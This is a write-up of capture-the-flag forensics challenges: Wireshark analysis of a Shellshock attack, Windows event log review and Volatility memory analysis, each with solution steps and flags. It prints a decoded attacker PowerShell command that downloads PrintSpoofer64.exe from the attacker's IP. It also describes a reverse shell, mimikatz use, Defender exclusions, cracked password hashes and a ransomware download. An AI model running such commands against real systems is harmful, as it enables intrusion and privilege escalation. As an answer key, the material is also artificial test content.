# Forensic Challenges

## Totally Shocking! #1

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

There is a system performing a network scan.  What is the IP and the Hostname of the 'attacker'?

Flag format: flag{IP_FQDN} e.g. flag{123.456.789.012_HACK_the.Gibson}

### Attachment:
totallyshocking.7z

### Steps:
1. Extract the 7zip archive
2. Open the PCAP file
3. Filter for ARP traffic
`arp`
(forensics/ts101.png)
4. Identify IP running network ping sweep
(forensics/ts102.png)
5. Filter for IP
`ip.addr == 192.168.177.132`
(forensics/ts103.png)
6. Identify FQDN in MDNS protocol infromation
(forensics/ts104.png)
7. Combine IP and FQDN as flag

### Flag:
`flag{192.168.177.132_DESKTOP-O85S4D0.local}`




## Totally Shocking! #2

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

The true attacker finally enumerates the victim.  What is the webserver and version running on the victim, and what is the website title?

Flag format: flag{server/version_Title} e.g. flag{Microsoft-IIS/7.5_Title_with_spaces_changed_to_underscores}

### Steps:
1. Filter for HTTP traffic
`http`
(forensics/ts201.png)
2. The first HTTP GET request is for /, which in response gives us the webserver version and title
3. Follow the HTTP stream for a clearer view
(forensics/ts202.png)
(forensics/ts203.png)
4. Combine the webserver and title for the flag

### Flag:
`flag{Apache/2.2.21 (Unix) DAV/2_[PentesterLab]_CVE-2014-6271}`




## Totally Shocking! #3

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

The attacker's first attempt to exploit the vulnerability was an attempt to retrieve a file.  The attempt failed, but what file did they try to retrieve?

Flag format: flag{full file path} e.g. flag{C:\Windows\win.ini}

### Steps:
1. Identify the vulnerability based on the website title in Q2, and shown in the stream
(forensics/ts301.png)
(forensics/ts302.png)
2. Search for cgi-bin/status (identified in stream)
(forensics/ts303.png)
3. The third result will identify the command the attacker attempted to run and retrieve a file contents
(forensics/ts304.png)
4. Follow the stream to see it more clearly
(forensics/ts305.png)

### Flag:
`flag{/etc/passwd}`




## Totally Shocking! #4

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

The attacker finally connected to the victim machine.  What port on the attacker machine did the use to connect, what was the first command they typed after connecting, and what directory were they running their commands?

Flag format: flag{PORT_command_full directory path} e.g. flag{12345_powershell.exe_C:\inetpub\adminscripts}

### Steps:
1. Open Conversations in the Statistics menu
(forensics/ts401.png)
2. Click on TCP, and sort by the relative start time
3. Identify the first call-back to the attacker in the conversation list, and the port reached
(forensics/ts402.png)
4. Select the line, and filter on the stream id
(forensics/ts403.png)
5. Right-click and follow the stream
6. Identify the commands run, which includes listing the current working directory
(forensics/ts404.png)
7. Combine port, command and path to form the flag

### Flag:
`flag{31173_id_/var/www/cgi-bin}`




## Totally Shocking! #5

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

After rage quitting, the attacker reconnected and managed to print the flag.  What is the flag?

Flag format: flag{something_here}

### Steps:
1. Clear the current filter, and go back to Conversations
2. Identify the second connection back to the attacker
3. Repeat steps from Q4 to filter for the stream
4. Identify the flag, and remove line breaks
(forensics/ts501.png)

### Flag:
`flag{@bs0lutl3y_5#o(k!n9}`




## Totally Shocking! #6

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

After a command failed, the attacked disconnected and reconnected again, and this time was able to elevate their privileges.  As all attackers do, this one exited the victim machine cleanly, but what were the last two commands they typed before exiting the system?

Flag format: flag{command #1_command #2} e.g. flag{Hack the Planet!!!_(^_^)}

### Steps:
1. Repeat steps for Q5 for the third connection
2. Identify the commands and combine for flag (note the question is asking for the commands *before* exiting the system)
(forensics/ts601.png)

### Flag:
`flag{whahaha I am gROOT!_:P}`




## If It Wasn't Recorded, It Didn't Happen #1

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

Shortly after the firewall settings were misconfigured, one of our student machines started receiving brute force attacks against it.  Can you find out what system was attacking the student machine, what IP is was from, and what country is associated with that IP?

Flag format: flag{hostname_IP_Country} e.g. flag{gibson_123.456.789.012_New Zealand}

### Attachment:
Logs.7z

### Hints:
That's a lot of logs...  Maybe you don't need all those little ones which seem to be empty?
If you were Microsoft, where would you record suspicious events?

### Steps:
1. Open the Security Log
2. Filter on Event ID 4625 (4625 is failed logon events)
(forensics/evtx101.png)
3. Identify the hostname and the IP which is consistently triggering failed login events
(forensics/evtx102.png)
4. Lookup the IP using your favourite tool to identify the country
(forensics/evtx103.png)
5. Combine the hostname, Ip and country to form the flag

### Flag:
`flag{kali_49.113.27.22_China}`




## If It Wasn't Recorded, It Didn't Happen #2

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

It seems that the attacker was successful in it's attempt, and was able to login with one of the local accounts.  When (UTC time) did the bruteforce attempt succeed, which account was it, and when (UTC time) did the attacker manually access the student machine with the compromised account?

Flag format: flag{successtimeUTC_account_manualloginUTC} e.g. flag{2024-02-14 12:34:56_therealdonaldtrump_2024-02-14 23:45:67}
Time format for this flag is: "yyyy-mm-dd hh:mm:ss" where hh = 24 hour time, and the time is in **UTC**.  Ignore milliseconds (do NOT round up to the next second).*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

It seems that the attacker was successful in it's attempt, and was able to login with one of the local accounts.  When (UTC time) did the bruteforce attempt succeed, which account was it, and when (UTC time) did the attacker manually access the student machine with the compromised account?

Flag format: flag{successtimeUTC_account_manualloginUTC} e.g. flag{2024-02-14 12:34:56_therealdonaldtrump_2024-02-14 23:45:67}
Time format for this flag is: "yyyy-mm-dd hh:mm:ss" where hh = 24 hour time, and the time is in **UTC**.  Ignore milliseconds (do NOT round up to the next second).

### Steps:
1. In the Security log, filter for 4624 (successful logins)
(forensics/evtx201.png)
2. Click the filter again, and then click XML
3. Edit the query manually and add the LogonTypes 3 and 10
```xml
*[System[(EventID=4624)] and (EventData[Data[@Name='LogonType']='3'] or EventData[Data[@Name='LogonType']='10'])]
```
(forensics/evtx202.png)
4. Identify Network logons (type 3) for user 'demo' from attacker's IP, followed by RemoteInteractive login (type 10) from same IP
5. Click on the first successful network login from attacker, click details > XML view, and you get the UTC event timestamp
(forensics/evtx203.png)
6. Repeat for the successful remote interactive login
7. Combine first timestamp, username, second timestampl for flag

### Flag:
`flag{2024-11-26 04:55:11_demo_2024-11-26 05:00:48}`




## If It Wasn't Recorded, It Didn't Happen #3

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

One of the first things the attacker attempted was to run an encoded PowerShell commond.  It failed, because they didn't fully encode the original command.  What is the deobfuscated command that failed (including any preceding spaces)?

Flag format: flag{deobfuscated command} e.g. flag{whoami /groups}

### Hints:
Where might you find PowerShell logs?

### Steps:
1. Open Windows Powershell Log
2. Filter for Event ID 400
(forensics/evtx301.png)
3. Identify the encoded powershell command in the log
(forensics/evtx302.png)
4. Copy encoded command to CyberChef and decode
(forensics/evtx303.png)

### Flag:
`flag{ = 'http://49.113.27.22/PrintSpoofer64.exe'; Invoke-WebRequest  -OutFile C:\Windows\Temp\print.exe}`




## If It Wasn't Recorded, It Didn't Happen #4

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

A second encoded command ran successfully, but failed due to the anticipated vulnerability not being exploitable.  What privilege did the attacker attempt to exploit?

Flag format: flag{privilege} e.g. flag{SeShutdownPrivilege}

### Steps:
1. Google "PrintSpoofer64"
2. Open github page and identify privilege it exploits
(forensics/evtx401.png)
3. Submit privilege name as flag

### Flag:
`flag{SeImpersonatePrivilege}`




## If It Wasn't Recorded, It Didn't Happen #5

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

Since the previous exploit failed, the attacker enumerated the users on the system and then successfully bruteforced the password of one of the admin users on the system.  The attacker then used the admin account to create a new user, and then assign that new user to the Administrator's group.  Which existing account was used to create the new account for the attacker, at what time (UTC time) was the new account created, what was the name of the new account, and at what time (UTC time) was it added to the Administrator group?

Flag format: flag{existingaccount_createtimeUTC_newaccount_elevationtimeUTC} e.g. flag{JoeBiden_2024-02-14 12:34:56_therealdonaldtrump_2024-02-14 23:45:67}
Time format for this flag is: "yyyy-mm-dd hh:mm:ss" where hh = 24 hour time, and the time is in **UTC**.  Ignore milliseconds (do NOT round up to the next second).

### Steps:
1. Using the same filters from Q1 and Q2, identify fred account was bruteforced, and successfully logged into by the attacker
(forensics/evtx501.png)
2. Then, filter the security log for event IDs 4720 (A user account was created) and 4732 (A member was added to a security-enabled local group)
(forensics/evtx502.png)
3. Find the user created and its timestamp in the 4720 event ID
(forensics/evtx503.png)
4. Find the timestamp the user was added to the administrator group in the 4732 event ID
(forensics/evtx504.png)
5. Combine the first timestamp, the username, and the second timestamp to form the flag

### Flag:
`flag{fred_2024-11-26 05:10:05_zerocool_2024-11-26 05:10:57}`




## If It Wasn't Recorded, It Didn't Happen #6

### Category:
Forensics

### Challenge:
*Note: These six challenges are independent of each other.  You do not have to complete #1 to be able to solve #2, etc. but the challenge files are attached to #1 ONLY.*

The attacker then logged in to the system using the new account, and downloaded a well known program to extract the password hashes from the system.  Unfortunately for the attacker, the antivirus quarantined the program, causing the attacker to add exceptions for certain paths on the system so they could re-download and run their program.  What are the two locations added as exceptions?  Enter them in the order they were added.

Flag format: flag{path1_path2} e.g. {C:\Windows\Temp_C:\ProgramData\Microsoft\NetFramework}

### Steps:
1. Open the Microsoft-Windows-Windows Defender%4Operational log
2. Filter on event ID 5007 (or just look at the top two events :))
(forensics/evtx601.png)
(forensics/evtx602.png)
3. Combine the first path and the second path as the flag


### Flag:
`flag{C:\Users\zerocool\Desktop_C:\Users\zerocool\Desktop\mimikatz}`




## How Forgetful #1

### Category:
Forensics

### Challenge:
*Note: The attached file is 658MB.  You will need this file to complete How Forgetful #1 - #6*

All Digital Forensics and Incident Response analysts need to maintain good chain of evidence logs, ensuring the evidence has not changed while in their custody.  What are the SHA-256 hashes of the artifact files?

Flag Format: flag{vmemSHA256_vmsnSHA256} e.g. flag{1234567890_0987654321}

**WARNING: This memory dump contains live malware, use extreme caution**

### Attachment:
memory.7z

### Steps:
1. Extract the 7zip file
2. Run sha256sum on the extracted files
```bash
sha256sum *
```
(forensics/hf101.png)
3. Combine the file hashes to form the flag

### Flag:
`flag{0e08d86f666cb7e389ccd9e2b68f14a4fd9c0f01a379db7a8feb940ca2cd510a_65774af5c8f7bb87df17c70b440e179f21498b92b5bd5dad566e71b8ffcae4eb}`




## How Forgetful #2

### Category:
Forensics

### Challenge:
*Note: Challenges 2-6 are independent of each other.  You do not have to complete #2 to be able to solve #3, etc. but the challenge files are attached to #1 ONLY.*

The attacker connected to the victim via a well known protocol, but what IP and port did the attacker use to connect to the victim?  Also, what was the victim's IP and port in the memory dump?

Flag format: flag{VictimIP_VictimPort_AttackerIP_AttackerPort} e.g. flag{123.456.789.012_12345_987.654.321.098_98765}

### Steps:
0. Download/Install Volatility from https://github.com/volatilityfoundation/volatility3
1. Identify the operating system of the memory dump, e.g.
```bash
strings victim.vmem | grep -i env | more
```
(forensics/hf201.png)
2. Run netscan on memory dump
```bash
vol -f victim.vmem windows.netscan
```
(forensics/hf202.png)
3. Identify victim IP, victim port, attacker IP and attacker port in results
(forensics/hf203.png)
4. Combine results found to form flag

### Flag:
`flag{54.196.27.16_3389_49.113.27.22_60184}`




## How Forgetful #3

### Category:
Forensics

### Challenge:
*Note: Challenges 2-6 are independent of each other.  You do not have to complete #2 to be able to solve #3, etc. but the challenge files are attached to #1 ONLY.*

Within the memory dump are password hashes for some of the users on the system.  Can you find the hashes of the two administrators (1004 and 1006)?

Flag format: {username1_hash_username2_hash} e.g. flag{lordnikon_1234567890_acidburn_0987654321}

### Steps:
0. Install pycryptodome if necessary
1. Run hashdump on memory dump
```bash
vol -f victim.vmem windows.hashdump
```
(forensics/hf301.png)
2. Identiy usernames and hashes of two admin users requested.  Note that "aad3b435b51404eeaad3b435b51404ee" is an empty LM hash, and not needed for the flag
3. Combine the usernames and hashes to form the flag

### Flag:
`flag{bob_24d9c99595080b241b3b4eb0cba8d8f4_fred_4a537119ceb6f51224dad23d01caa45c}`
`flag{fred_4a537119ceb6f51224dad23d01caa45c_bob_24d9c99595080b241b3b4eb0cba8d8f4}`




## How Forgetful #4

### Category:
Forensics

### Challenge:
*Note: Challenges 2-6 are independent of each other.  You do not have to complete #2 to be able to solve #3, etc. but the challenge files are attached to #1 ONLY.*

The attacker was logged in using an administrative account and was able to open a file belonging to another administrator.  What is the contents of that file?

Flag Format: Contents_of_file

### Steps:
1. Run the cmdline plugin on the memory dump
```bash
vol -f victim.vmem windows.cmdline
```
2. Identify the administrator file open in the command line
(forensics/hf401.png)
3. Run the filescan plugin, filtering for the file identified
```bash
vol -f victim.vmem windows.filescan | grep secret.txt
```
(forensics/hf402.png)
4. Dump the file to the local directory using the memory address found (ignore the error)
```bash
vol -f victim.vmem -o . windows.dumpfiles --virtaddr 0xd5887b71e570
```
(forensics/hf403.png)
5. Read the contents of the file extracted to get the flag
```bash
cat file.0xd5887b71e570.0xd5887b827490.DataSectionObject.secret.txt.dat
```
(forensics/hf404.png)

### Flag:
`flag{s3cre7s_hiDden_i|\|_mem0ry}`




## How Forgetful #5

### Category:
Forensics

### Challenge:
*Note: Challenges 2-6 are independent of each other.  You do not have to complete #2 to be able to solve #3, etc. but the challenge files are attached to #1 ONLY.*

The attacker used a well known exploit binary to extract the password hashes of some of the users.  They also created a file on their desktop containing the output.  It seems the program didn't work quite as intended, because the output only produced hashes belonging to the attacker.  What is the NTLM and SHA1 of the attackers password as recorded in the output?

Flag format: flag{ntlm_sha1} e.g. flag{1234567890_0987654321}

Hints (added late):
Maybe the contents of the file are there if you dump the process?

### Steps:
1. Although we could see the file open in notepad in the cmdline output, searching for the file in filescan doesn't produce any results.  Instead, let's dump the whole notepad process using memmap
```bash
vol -f victim.vmem -o . windows.memmap --dump --pid 3108
```
(forensics/hf501.png)
2. Run strings on the outputted file, and output to a text file
```bash
strings pid.3108.dmp > 3108.txt
```
(forensics/hf502.png)
3. Open the text file and find the hashes among the extracted strings
(forensics/hf503.png)
4. Combine the two hashes to form the flag (Note: They must be valid hashes for the flag.  Some strings get duplicated/truncated in the memory dump, e.g. the one highlighted in the image above.  Test them with *hashid*)

### Flag:
`flag{4be91f2e1190d17868c402594baf23c1_775eb59ef1abcc863741b05e7d59fd57d82f60d8}`




## How Forgetful #6

### Category:
Forensics

### Challenge:
*Note: Challenges 2-6 are independent of each other.  You do not have to complete #2 to be able to solve #3, etc. but the challenge files are attached to #1 ONLY.*

Just before the system administrator noticed what was happening and jumped in to save the day (which is what sysadmins do every day!), the attacker downloaded a piece of malware to the system.  What was the original filename of the malware, and what filename was it saved as locally?

Flag format: flag{oldname_newname} e.g. flag{petya.zip_notpetya.zip}

Hints (added late):
The attacker seems to put things on his Desktop...  Maybe it's time to try a simpler approach...

**DISCLAIMER:** *The file downloaded to the victim machine is real, honest-to-God, gen-you-whine bad guy stuff.  **DO NOT** try to extract it from the memory dump (and no, I will not tell you how to do it), but also, do not Google and download this just for fun, ESPECIALLY if you are doing this CTF on a corporate device (which you shouldn't be!).  You have been warned...*

### Steps:
1. Repeat the steps for Q5, but extracting for powershell
```bash
vol -f victim.vmem windows.cmdline | grep -i powershell
vol -f victim.vmem -o . windows.memmap --dump --pid 8788
strings pid.8788.dmp > 8788.txt
```
(forensics/hf601.png)
2. Grep for the attacker's username
```bash
grep zerocool 8788.txt | more
```
(forensics/hf602.png)
3. Identify the filenames of the original file and the saved file
(forensics/hf603.png)
4. Combine the filenames to form the flag

### Flag:
`flag{Win32.HelloKittyRansomware.7z_hellokitty.7z}`